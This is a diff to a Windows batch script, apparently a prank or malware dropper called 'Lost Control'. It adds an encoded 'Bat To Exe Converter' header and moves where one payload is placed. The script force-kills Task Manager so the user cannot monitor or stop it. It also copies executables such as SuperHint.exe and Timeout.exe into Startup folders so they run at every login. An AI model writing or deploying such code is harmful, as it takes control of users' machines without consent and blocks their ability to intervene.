@@ -1,3 +1,43 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kduOH44KSOoUJ9
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kduePy4+bJp1UYNA==
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kduuTy/P7Jp1UYNA==
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kdvODy4f7Jp1UYNA==
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kdvfzy4u/Jp1UYNA==
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kd5Of37qSCukh9
+::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kY5+bvoeCXpS0=
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCuDJGqH5ksgPCdaag2QOVezBboSpuH44Io=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJGqH5ksgPCdaag2QOVefCLEQ4eb+oe+fpy0=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
 taskkill /f /im taskmgr.exe
 if exist "%localappdata%\Lost Control" rd "%localappdata%\Lost Control"/q/s
@@ -35,8 +75,8 @@ if exist "%localappdata%\Lost Control\dont.jpg" del dont.jpg/q
 copy a4hint.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe"/y
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe" del a4hint.exe/q
 
-copy a5time.exe "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe"/y
-if exist "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe" del a5time.exe/q
+copy a5time.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe"/y
+if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe" del a5time.exe/q
 
 
 
